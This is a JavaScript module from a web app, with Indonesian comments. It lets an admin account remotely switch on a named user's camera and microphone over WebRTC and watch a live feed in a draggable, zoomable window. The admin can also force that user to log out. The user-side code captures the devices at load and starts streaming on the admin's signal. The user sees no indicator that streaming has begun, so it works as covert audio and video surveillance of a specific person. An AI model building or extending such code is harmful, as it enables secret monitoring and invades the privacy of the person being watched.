// ================================================================
// MONITOR.JS - WebRTC Monitoring
// Draggable + pinch-to-zoom + fullscreen seperti lightbox
// ================================================================

const ICE_SERVERS = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' },
  ]
};

const ADMIN_NAME = "Jef'z";
const USER_NAME  = "Ndifaa";

let monitorChannel = null;
let peerConnection = null;
let localStream    = null;
let isVideoOn      = false;
let isAudioOn      = false;
let streamActive   = false;
let monitorInited  = false;
let hasCamera      = false;
let hasMic         = false;

// Drag state
let dragActive = false, dragStartX = 0, dragStartY = 0, dragOrigLeft = 0, dragOrigTop = 0;
// Pinch state
let pinchActive = false, pinchStartDist = 0, pinchStartW = 0, pinchStartH = 0;
// Fullscreen state
let monitorFullscreen = false;

// ===== INIT =====
async function initMonitor() {
  if (monitorInited) return;
  monitorInited = true;
  if (!currentAccount) return;
  if (currentAccount.name === USER_NAME) {
    await initUserSide();
  } else if (currentAccount.name === ADMIN_NAME) {
    initAdminSide();
  }
  listenForceLogout();
}

// ================================================================
// SISI NDIFAA
// ================================================================

async function initUserSide() {
  await detectDevices();
  if (!hasCamera && !hasMic) { showMonitorNotice('Tidak ada kamera atau mikrofon terdeteksi.'); return; }
  await requestStream();
  listenSignals(USER_NAME, async (signal) => {
    if      (signal.type === 'start_stream')  await startUserStream();
    else if (signal.type === 'stop_stream')   stopUserStream();
    else if (signal.type === 'answer')        await handleAnswer(signal.payload);
    else if (signal.type === 'ice_candidate') await handleRemoteIce(signal.payload);
  });
}

async function detectDevices() {
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    hasCamera = devices.some(d => d.kind === 'videoinput');
    hasMic    = devices.some(d => d.kind === 'audioinput');
  } catch (e) {}
}

async function requestStream() {
  if (hasCamera && hasMic) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({
        video: { width:{ideal:640}, height:{ideal:480}, facingMode:'user' },
        audio: { echoCancellation:true, noiseSuppression:true }
      });
      return;
    } catch (e) {}
  }
  if (hasMic) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({ video:false, audio:{ echoCancellation:true, noiseSuppression:true } });
      hasCamera = false; return;
    } catch (e) {}
  }
  if (hasCamera) {
    try {
      localStream = await navigator.mediaDevices.getUserMedia({ video:{ width:{ideal:640}, height:{ideal:480} }, audio:false });
      hasMic = false; return;
    } catch (e) {}
  }
  showMonitorNotice('Gagal mengakses kamera/mikrofon.');
}

async function startUserStream() {
  if (!localStream) { await requestStream(); if (!localStream) return; }
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
  peerConnection = new RTCPeerConnection(ICE_SERVERS);
  localStream.getTracks().forEach(track => peerConnection.addTrack(track, localStream));
  peerConnection.onicecandidate = async (e) => {
    if (e.candidate) await sendSignal({ type:'ice_candidate', from:USER_NAME, to:ADMIN_NAME, payload:JSON.stringify(e.candidate) });
  };
  const offer = await peerConnection.createOffer();
  await peerConnection.setLocalDescription(offer);
  await sendSignal({ type:'offer', from:USER_NAME, to:ADMIN_NAME, payload:JSON.stringify({ offer, hasVideo:hasCamera, hasAudio:hasMic }) });
}

async function handleAnswer(answerPayload) {
  if (!peerConnection) return;
  try {
    const parsed = JSON.parse(answerPayload);
    const answer = parsed.answer || parsed;
    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
  } catch (e) {}
}

function stopUserStream() {
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
}

// ================================================================
// SISI ADMIN
// ================================================================

function initAdminSide() {
  renderAdminControls();
  createMonitorView();
  listenSignals(ADMIN_NAME, async (signal) => {
    if      (signal.type === 'offer')         await handleOffer(signal.payload);
    else if (signal.type === 'ice_candidate') await handleRemoteIce(signal.payload);
  });
}

function renderAdminControls() {
  const topbarRight = document.querySelector('.topbar-right');
  if (!topbarRight || document.getElementById('monitorControls')) return;
  const wrap = document.createElement('div');
  wrap.id = 'monitorControls';
  wrap.style.cssText = 'display:flex;gap:4px;align-items:center;';

  const videoBtn = document.createElement('button');
  videoBtn.id = 'monitorVideoBtn'; videoBtn.className = 'tb-btn monitor-btn';
  videoBtn.title = 'Monitor Video'; videoBtn.innerHTML = '📵'; videoBtn.onclick = toggleMonitorVideo;
  wrap.appendChild(videoBtn);

  const audioBtn = document.createElement('button');
  audioBtn.id = 'monitorAudioBtn'; audioBtn.className = 'tb-btn monitor-btn';
  audioBtn.title = 'Monitor Audio'; audioBtn.innerHTML = '🔇'; audioBtn.onclick = toggleMonitorAudio;
  wrap.appendChild(audioBtn);

  const logoutBtn = document.createElement('button');
  logoutBtn.id = 'forceLogoutBtn'; logoutBtn.className = 'tb-btn monitor-btn';
  logoutBtn.title = 'Force Logout Ndifaa'; logoutBtn.innerHTML = '⏏';
  logoutBtn.style.color = 'var(--danger)'; logoutBtn.onclick = forceLogoutUser;
  wrap.appendChild(logoutBtn);

  const themeBtn = topbarRight.querySelector('.theme-btn');
  if (themeBtn) topbarRight.insertBefore(wrap, themeBtn); else topbarRight.prepend(wrap);
}

// ===== BUAT MONITOR VIEW (FLOATING) =====
function createMonitorView() {
  if (document.getElementById('monitorFloating')) return;

  // Floating window
  const floating = document.createElement('div');
  floating.id = 'monitorFloating';
  floating.style.cssText = [
    'display:none',
    'position:fixed',
    'bottom:calc(var(--nav-h) + 14px)',
    'right:14px',
    'width:200px',
    'z-index:600',
    'border-radius:16px',
    'overflow:hidden',
    'box-shadow:0 8px 40px rgba(0,0,0,0.5)',
    'border:1.5px solid rgba(255,255,255,0.18)',
    'background:#000',
    'touch-action:none',
    'cursor:grab',
    'transition:box-shadow 0.2s',
  ].join(';');

  // Header bar (untuk drag)
  const header = document.createElement('div');
  header.id = 'monitorHeader';
  header.style.cssText = [
    'display:flex',
    'align-items:center',
    'justify-content:space-between',
    'padding:6px 8px',
    'background:linear-gradient(135deg,rgba(0,0,0,0.7),rgba(20,20,20,0.9))',
    'backdrop-filter:blur(8px)',
    'cursor:grab',
    'user-select:none',
    '-webkit-user-select:none',
  ].join(';');

  header.innerHTML =
    '<div style="display:flex;align-items:center;gap:6px;">' +
      '<div style="width:7px;height:7px;border-radius:50%;background:#ff453a;animation:livePulse 1.5s ease infinite;"></div>' +
      '<span style="font-size:10px;font-weight:700;color:white;letter-spacing:0.5px;">LIVE</span>' +
    '</div>' +
    '<div style="display:flex;gap:4px;">' +
      '<button id="monitorExpandBtn" onclick="openMonitorFullscreen()" style="background:rgba(255,255,255,0.15);border:none;color:white;border-radius:6px;width:22px;height:22px;font-size:11px;cursor:pointer;display:flex;align-items:center;justify-content:center;" title="Fullscreen">⛶</button>' +
      '<button onclick="stopAndHideMonitor()" style="background:rgba(255,59,48,0.7);border:none;color:white;border-radius:6px;width:22px;height:22px;font-size:11px;cursor:pointer;display:flex;align-items:center;justify-content:center;" title="Tutup">✕</button>' +
    '</div>';
  floating.appendChild(header);

  // Video element
  const vid = document.createElement('video');
  vid.id = 'monitorVideo'; vid.autoplay = true; vid.playsInline = true; vid.muted = true;
  vid.style.cssText = 'width:100%;display:block;background:#000;aspect-ratio:4/3;object-fit:cover;';
  vid.ondblclick = openMonitorFullscreen;
  floating.appendChild(vid);

  // Audio only badge
  const badge = document.createElement('div');
  badge.id = 'audioOnlyBadge';
  badge.style.cssText = 'display:none;width:100%;height:120px;background:linear-gradient(135deg,#1c1c1e,#2c2c2e);align-items:center;justify-content:center;flex-direction:column;gap:8px;';
  badge.innerHTML = '<div style="font-size:40px;">🎙</div><div style="font-size:11px;color:rgba(255,255,255,0.7);font-weight:600;">Audio Only</div>';
  floating.appendChild(badge);

  // Resize handle (pojok kanan bawah)
  const resizeHandle = document.createElement('div');
  resizeHandle.id = 'monitorResizeHandle';
  resizeHandle.style.cssText = 'position:absolute;bottom:0;right:0;width:18px;height:18px;cursor:nwse-resize;display:flex;align-items:center;justify-content:center;';
  resizeHandle.innerHTML = '<svg width="10" height="10" viewBox="0 0 10 10"><path d="M9 1L1 9M5 1L1 5M9 5L5 9" stroke="rgba(255,255,255,0.4)" stroke-width="1.5" stroke-linecap="round"/></svg>';
  floating.appendChild(resizeHandle);

  document.body.appendChild(floating);

  // Init drag & resize
  initDrag(floating, header);
  initResize(floating, resizeHandle);
  initPinchZoom(floating);
}

// ===== DRAG =====
function initDrag(el, handle) {
  // Mouse drag
  handle.addEventListener('mousedown', (e) => {
    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) return;
    dragActive = true;
    dragStartX = e.clientX;
    dragStartY = e.clientY;
    const rect = el.getBoundingClientRect();
    dragOrigLeft = rect.left;
    dragOrigTop  = rect.top;
    el.style.cursor = 'grabbing';
    el.style.transition = 'none';
    e.preventDefault();
  });

  document.addEventListener('mousemove', (e) => {
    if (!dragActive) return;
    const dx = e.clientX - dragStartX;
    const dy = e.clientY - dragStartY;
    const newLeft = Math.max(0, Math.min(window.innerWidth  - el.offsetWidth,  dragOrigLeft + dx));
    const newTop  = Math.max(0, Math.min(window.innerHeight - el.offsetHeight, dragOrigTop  + dy));
    el.style.left   = newLeft + 'px';
    el.style.top    = newTop  + 'px';
    el.style.right  = 'auto';
    el.style.bottom = 'auto';
  });

  document.addEventListener('mouseup', () => {
    if (!dragActive) return;
    dragActive = false;
    el.style.cursor = 'grab';
    el.style.transition = 'box-shadow 0.2s';
  });

  // Touch drag
  let touchId = null;
  handle.addEventListener('touchstart', (e) => {
    if (e.target.tagName === 'BUTTON' || e.target.closest('button')) return;
    if (e.touches.length !== 1) return;
    const t = e.touches[0];
    touchId    = t.identifier;
    dragActive = true;
    dragStartX = t.clientX;
    dragStartY = t.clientY;
    const rect = el.getBoundingClientRect();
    dragOrigLeft = rect.left;
    dragOrigTop  = rect.top;
    el.style.transition = 'none';
  }, { passive: true });

  handle.addEventListener('touchmove', (e) => {
    if (!dragActive) return;
    const t = Array.from(e.touches).find(t => t.identifier === touchId);
    if (!t) return;
    const dx = t.clientX - dragStartX;
    const dy = t.clientY - dragStartY;
    const newLeft = Math.max(0, Math.min(window.innerWidth  - el.offsetWidth,  dragOrigLeft + dx));
    const newTop  = Math.max(0, Math.min(window.innerHeight - el.offsetHeight, dragOrigTop  + dy));
    el.style.left   = newLeft + 'px';
    el.style.top    = newTop  + 'px';
    el.style.right  = 'auto';
    el.style.bottom = 'auto';
    if (e.cancelable) e.preventDefault();
  }, { passive: false });

  handle.addEventListener('touchend', () => { dragActive = false; el.style.transition = 'box-shadow 0.2s'; });
}

// ===== RESIZE (mouse) =====
function initResize(el, handle) {
  let resizing = false, startX = 0, startY = 0, startW = 0, startH = 0;

  handle.addEventListener('mousedown', (e) => {
    resizing = true; startX = e.clientX; startY = e.clientY;
    startW = el.offsetWidth; startH = el.offsetHeight;
    e.preventDefault(); e.stopPropagation();
  });

  document.addEventListener('mousemove', (e) => {
    if (!resizing) return;
    const newW = Math.max(160, Math.min(480, startW + (e.clientX - startX)));
    const newH = Math.max(120, Math.min(400, startH + (e.clientY - startY)));
    el.style.width = newW + 'px';
    // Height ikut aspect ratio video
  });

  document.addEventListener('mouseup', () => { resizing = false; });

  // Touch resize
  handle.addEventListener('touchstart', (e) => {
    if (e.touches.length !== 1) return;
    resizing = true; startX = e.touches[0].clientX; startY = e.touches[0].clientY;
    startW = el.offsetWidth; startH = el.offsetHeight;
    e.stopPropagation();
  }, { passive: true });

  handle.addEventListener('touchmove', (e) => {
    if (!resizing || e.touches.length !== 1) return;
    const newW = Math.max(160, Math.min(480, startW + (e.touches[0].clientX - startX)));
    el.style.width = newW + 'px';
    if (e.cancelable) e.preventDefault();
  }, { passive: false });

  handle.addEventListener('touchend', () => { resizing = false; });
}

// ===== PINCH TO ZOOM =====
function initPinchZoom(el) {
  el.addEventListener('touchstart', (e) => {
    if (e.touches.length !== 2) return;
    pinchActive   = true;
    pinchStartDist = getPinchDist(e.touches);
    pinchStartW    = el.offsetWidth;
  }, { passive: true });

  el.addEventListener('touchmove', (e) => {
    if (!pinchActive || e.touches.length !== 2) return;
    const dist = getPinchDist(e.touches);
    const scale = dist / pinchStartDist;
    const newW  = Math.max(160, Math.min(480, pinchStartW * scale));
    el.style.width = newW + 'px';
    if (e.cancelable) e.preventDefault();
  }, { passive: false });

  el.addEventListener('touchend', () => { pinchActive = false; });
}

function getPinchDist(touches) {
  const dx = touches[0].clientX - touches[1].clientX;
  const dy = touches[0].clientY - touches[1].clientY;
  return Math.sqrt(dx * dx + dy * dy);
}

// ===== FULLSCREEN (seperti lightbox) =====
function openMonitorFullscreen() {
  if (monitorFullscreen) return;
  monitorFullscreen = true;

  // Buat overlay seperti lightbox
  const overlay = document.createElement('div');
  overlay.id = 'monitorFullscreenOverlay';
  overlay.style.cssText = [
    'position:fixed', 'inset:0', 'z-index:9100',
    'display:flex', 'align-items:center', 'justify-content:center',
    'background:rgba(0,0,0,0.88)',
    'backdrop-filter:blur(32px) saturate(140%)',
    '-webkit-backdrop-filter:blur(32px) saturate(140%)',
    'animation:lbFadeIn 0.22s ease',
  ].join(';');

  // Card media (seperti lightbox-media-wrap)
  const card = document.createElement('div');
  card.style.cssText = [
    'position:relative',
    'z-index:5',
    'display:flex',
    'align-items:center',
    'justify-content:center',
    'width:min(92vw,720px)',
    'max-height:85vh',
    'background:rgba(255,255,255,0.06)',
    'backdrop-filter:blur(16px) saturate(150%)',
    '-webkit-backdrop-filter:blur(16px) saturate(150%)',
    'border:1px solid rgba(255,255,255,0.15)',
    'border-radius:22px',
    'box-shadow:0 0 0 1px rgba(255,255,255,0.06) inset,0 24px 80px rgba(0,0,0,0.5)',
    'overflow:hidden',
    'animation:lbCardIn 0.28s cubic-bezier(0.34,1.15,0.64,1)',
  ].join(';');

  // Clone video stream ke fullscreen
  const vid = document.getElementById('monitorVideo');
  const fsVid = document.createElement('video');
  fsVid.id = 'monitorFsVideo';
  fsVid.autoplay = true; fsVid.playsInline = true; fsVid.muted = !isAudioOn;
  fsVid.style.cssText = 'width:100%;max-height:80vh;object-fit:contain;display:block;';
  if (vid && vid.srcObject) fsVid.srcObject = vid.srcObject;

  // Audio only badge untuk fullscreen
  const badge = document.createElement('div');
  badge.id = 'fsBadge';
  const hasVid = vid && vid.srcObject && vid.srcObject.getVideoTracks().length > 0;
  badge.style.cssText = 'display:' + (hasVid ? 'none' : 'flex') + ';width:100%;height:300px;align-items:center;justify-content:center;flex-direction:column;gap:12px;';
  badge.innerHTML = '<div style="font-size:64px;">🎙</div><div style="font-size:16px;color:rgba(255,255,255,0.7);font-weight:600;">Audio Only - Sedang Live</div>';
  if (hasVid) { fsVid.style.display = 'block'; badge.style.display = 'none'; } else { fsVid.style.display = 'none'; }

  card.appendChild(fsVid);
  card.appendChild(badge);

  // Live badge
  const liveBadge = document.createElement('div');
  liveBadge.style.cssText = 'position:absolute;top:14px;left:14px;display:flex;align-items:center;gap:6px;background:rgba(255,59,48,0.85);padding:4px 10px;border-radius:10px;';
  liveBadge.innerHTML = '<div style="width:7px;height:7px;border-radius:50%;background:white;animation:livePulse 1.5s ease infinite;"></div><span style="font-size:11px;font-weight:700;color:white;letter-spacing:0.5px;">LIVE</span>';
  card.appendChild(liveBadge);

  // Tombol tutup
  const closeBtn = document.createElement('button');
  closeBtn.style.cssText = 'position:absolute;top:14px;right:14px;width:36px;height:36px;border-radius:50%;border:none;background:rgba(255,255,255,0.18);border:1px solid rgba(255,255,255,0.25);color:white;cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);font-size:16px;';
  closeBtn.innerHTML = '✕';
  closeBtn.onclick = closeMonitorFullscreen;
  card.appendChild(closeBtn);

  // Tombol mute/unmute di fullscreen
  const muteBtn = document.createElement('button');
  muteBtn.style.cssText = 'position:absolute;bottom:14px;right:14px;width:40px;height:40px;border-radius:50%;border:none;background:rgba(255,255,255,0.18);border:1px solid rgba(255,255,255,0.25);color:white;cursor:pointer;display:flex;align-items:center;justify-content:center;backdrop-filter:blur(12px);font-size:20px;';
  muteBtn.innerHTML = isAudioOn ? '🔊' : '🔇';
  muteBtn.onclick = () => {
    isAudioOn = !isAudioOn;
    fsVid.muted = !isAudioOn;
    const mainVid = document.getElementById('monitorVideo');
    if (mainVid) mainVid.muted = !isAudioOn;
    const audioBtn = document.getElementById('monitorAudioBtn');
    if (audioBtn) { audioBtn.innerHTML = isAudioOn ? '🔊' : '🔇'; audioBtn.style.color = isAudioOn ? '#34c759' : ''; }
    muteBtn.innerHTML = isAudioOn ? '🔊' : '🔇';
  };
  card.appendChild(muteBtn);

  overlay.appendChild(card);

  // Tap overlay untuk tutup
  overlay.addEventListener('click', (e) => { if (e.target === overlay) closeMonitorFullscreen(); });

  // Swipe down untuk tutup (mobile)
  let swipeStartY = 0;
  overlay.addEventListener('touchstart', (e) => { swipeStartY = e.touches[0].clientY; }, { passive: true });
  overlay.addEventListener('touchend', (e) => {
    const dy = e.changedTouches[0].clientY - swipeStartY;
    if (dy > 80) closeMonitorFullscreen();
  });

  document.body.appendChild(overlay);
  document.body.style.overflow = 'hidden';
}

function closeMonitorFullscreen() {
  monitorFullscreen = false;
  const overlay = document.getElementById('monitorFullscreenOverlay');
  if (overlay) {
    overlay.style.animation = 'overlayOut 0.18s ease forwards';
    setTimeout(() => { if (overlay.parentNode) overlay.remove(); }, 180);
  }
  document.body.style.overflow = '';
}

// ===== STOP & HIDE MONITOR =====
function stopAndHideMonitor() {
  stopAdminStream();
}

function showMonitorFloating() {
  const el = document.getElementById('monitorFloating');
  if (el) {
    el.style.display = 'block';
    el.style.animation = 'monitorIn 0.3s cubic-bezier(0.34,1.56,0.64,1)';
  }
}

function hideMonitorFloating() {
  const el = document.getElementById('monitorFloating');
  if (el) el.style.display = 'none';
}

// ===== TOGGLE CONTROLS =====
async function toggleMonitorVideo() {
  const btn = document.getElementById('monitorVideoBtn');
  if (!isVideoOn && !streamActive) {
    isVideoOn = true;
    btn.innerHTML = '📹'; btn.style.color = '#34c759';
    await sendSignal({ type:'start_stream', from:ADMIN_NAME, to:USER_NAME, payload:'{}' });
    streamActive = true;
    toast('Monitoring dimulai...');
  } else if (isVideoOn || streamActive) {
    isVideoOn = false;
    btn.innerHTML = '📵'; btn.style.color = '';
    isAudioOn = false;
    const audioBtn = document.getElementById('monitorAudioBtn');
    if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }
    await sendSignal({ type:'stop_stream', from:ADMIN_NAME, to:USER_NAME, payload:'{}' });
    stopAdminStream();
  }
}

async function toggleMonitorAudio() {
  const btn = document.getElementById('monitorAudioBtn');
  const vid = document.getElementById('monitorVideo');
  const fsVid = document.getElementById('monitorFsVideo');
  if (!isAudioOn) {
    isAudioOn = true;
    btn.innerHTML = '🔊'; btn.style.color = '#34c759';
    if (vid) vid.muted = false;
    if (fsVid) fsVid.muted = false;
    if (!streamActive) {
      isVideoOn = true;
      const videoBtn = document.getElementById('monitorVideoBtn');
      if (videoBtn) { videoBtn.innerHTML = '📹'; videoBtn.style.color = '#34c759'; }
      await sendSignal({ type:'start_stream', from:ADMIN_NAME, to:USER_NAME, payload:'{}' });
      streamActive = true;
      toast('Audio monitoring aktif...');
    } else { toast('Audio ON'); }
  } else {
    isAudioOn = false;
    btn.innerHTML = '🔇'; btn.style.color = '';
    if (vid) vid.muted = true;
    if (fsVid) fsVid.muted = true;
    toast('Audio muted');
  }
}

// ===== HANDLE OFFER (ADMIN) =====
async function handleOffer(offerPayload) {
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
  peerConnection = new RTCPeerConnection(ICE_SERVERS);

  peerConnection.onicecandidate = async (e) => {
    if (e.candidate) await sendSignal({ type:'ice_candidate', from:ADMIN_NAME, to:USER_NAME, payload:JSON.stringify(e.candidate) });
  };

  peerConnection.onconnectionstatechange = () => {
    if (peerConnection && peerConnection.connectionState === 'failed') {
      toast('Koneksi monitor gagal', false); stopAdminStream();
    }
  };

  peerConnection.ontrack = (event) => {
    const vid   = document.getElementById('monitorVideo');
    const badge = document.getElementById('audioOnlyBadge');
    const view  = document.getElementById('monitorFloating');
    if (!vid || !view) return;

    if (vid.srcObject !== event.streams[0]) vid.srcObject = event.streams[0];
    vid.muted = !isAudioOn;

    // Sync ke fullscreen jika sedang terbuka
    const fsVid = document.getElementById('monitorFsVideo');
    if (fsVid && fsVid.srcObject !== event.streams[0]) { fsVid.srcObject = event.streams[0]; fsVid.muted = !isAudioOn; }

    const hasVideoTrack = event.streams[0].getVideoTracks().length > 0;
    if (hasVideoTrack) {
      vid.style.display = 'block';
      if (badge) badge.style.display = 'none';
    } else {
      vid.style.display = 'none';
      if (badge) badge.style.cssText = badge.style.cssText.replace('display:none','display:flex');
    }

    showMonitorFloating();
    toast('Monitor tersambung ✓');
  };

  let offer, hasVideo = true, hasAudio = true;
  try {
    const parsed = JSON.parse(offerPayload);
    if (parsed.offer) { offer = parsed.offer; hasVideo = parsed.hasVideo !== undefined ? parsed.hasVideo : true; hasAudio = parsed.hasAudio !== undefined ? parsed.hasAudio : true; }
    else offer = parsed;
  } catch (e) { return; }

  await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
  const answer = await peerConnection.createAnswer();
  await peerConnection.setLocalDescription(answer);
  await sendSignal({ type:'answer', from:ADMIN_NAME, to:USER_NAME, payload:JSON.stringify({ answer }) });
}

function stopAdminStream() {
  if (peerConnection) { try { peerConnection.close(); } catch (e) {} peerConnection = null; }
  streamActive = false; isVideoOn = false; isAudioOn = false;
  closeMonitorFullscreen();
  hideMonitorFloating();
  const videoBtn = document.getElementById('monitorVideoBtn');
  const audioBtn = document.getElementById('monitorAudioBtn');
  if (videoBtn) { videoBtn.innerHTML = '📵'; videoBtn.style.color = ''; }
  if (audioBtn) { audioBtn.innerHTML = '🔇'; audioBtn.style.color = ''; }
  const vid = document.getElementById('monitorVideo');
  if (vid) { try { vid.srcObject = null; } catch (e) {} }
  toast('Monitoring dimatikan');
}

// ================================================================
// FORCE LOGOUT
// ================================================================

async function forceLogoutUser() {
  const ok = await showConfirm('Logout Ndifaa dari semua device?', { icon:'⏏', title:'Force Logout', okText:'Logout', cancelText:'Batal' });
  if (!ok) return;
  try {
    await sb.from('user_sessions').delete().eq('username', USER_NAME);
    await sb.from('webrtc_signals').insert([{ type:'force_logout', from_user:ADMIN_NAME, to_user:USER_NAME, payload:'{}' }]);
    toast('Ndifaa berhasil di-logout');
  } catch (e) { toast('Gagal logout', false); }
}

function listenForceLogout() {
  if (!currentAccount || currentAccount.name !== USER_NAME) return;
  sb.channel('force_logout_' + Date.now())
    .on('postgres_changes', { event:'INSERT', schema:'public', table:'webrtc_signals', filter:'to_user=eq.'+USER_NAME }, (payload) => {
      if (!payload.new || payload.new.type !== 'force_logout') return;
      toast('Session diakhiri oleh admin');
      setTimeout(() => { sessionStorage.clear(); window.location.href = 'index.html'; }, 1500);
    })
    .subscribe();
}

// ================================================================
// SHARED HELPERS
// ================================================================

async function sendSignal({ type, from, to, payload }) {
  try { await sb.from('webrtc_signals').insert([{ type, from_user:from, to_user:to, payload:payload||'{}' }]); }
  catch (err) { console.error('[Monitor] sendSignal error:', err); }
}

function listenSignals(forUser, callback) {
  if (monitorChannel) { try { sb.removeChannel(monitorChannel); } catch (e) {} }
  monitorChannel = sb.channel('monitor_' + forUser + '_' + Date.now())
    .on('postgres_changes', { event:'INSERT', schema:'public', table:'webrtc_signals', filter:'to_user=eq.'+forUser }, (payload) => {
      if (!payload.new || payload.new.type === 'force_logout') return;
      callback(payload.new);
    })
    .subscribe();
}

async function handleRemoteIce(icePayload) {
  if (!peerConnection) return;
  try { await peerConnection.addIceCandidate(new RTCIceCandidate(JSON.parse(icePayload))); }
  catch (e) {}
}

function showMonitorNotice(msg) {
  const t = document.getElementById('toast');
  if (!t) return;
  t.textContent = msg; t.className = 'toast show err';
  setTimeout(() => { t.className = 'toast'; }, 6000);
}
